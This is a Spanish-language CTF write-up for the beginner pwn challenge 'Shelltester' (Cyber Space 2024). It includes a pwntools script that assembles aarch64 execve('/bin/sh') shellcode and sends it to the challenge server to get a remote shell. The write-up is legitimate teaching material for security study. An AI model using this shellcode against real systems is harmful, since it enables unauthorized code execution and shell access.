---
layout: post
title: Shelltester Cyber Space '24
comments: true
categories: [Pwn, Writeups, CyberSpace]
---

Este es un writeup de una de mis solves durante el CTF **Cyber Space 2024**. En este caso se trata de un reto de la categoría de *begginer-pwn*.

# Reconocimiento

Se nos da un binario con arquitectura *aarch64-little* (ARM de 64 bits little endian). Si lanzamos *checksec*:

```
Arch:       aarch64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

A la hora de ejecutarlo directamente nos dará un error debido a la arquitectura, para ello nos dan un *Dockerfile*, aunque también podemos conectarnos por *netcat* al servidor de la competición. Al ejecutar nos pide que le pasemos un *shellcode* y si analizamos con *gdb*, veremos que el shellcode que pasemos se ejecutará, por tanto debemos pasarle simplemente un código para dicha arquitectura.

# Explotación

Para facilitar la interacción con el servidor, nos crearemos un script con *pwntools* en *python*:

```python
#! /bin/python3

from pwn import *

context.arch = 'aarch64'

shellcode = shellcraft.execve('/bin/sh')    # Nos da un shellcode (ya hemos especificado la arquitectura arriba)
shellcode = asm(shellcode)                  # Compilamos el shellcode

p = remote('shelltester.challs.csc.tf', 1337)

p.send(shellcode)

p.interactive()
```

Ejecutando el código recibiremos una shell y sólo nos faltaría lanzar un `cat flag` para ver la flag.
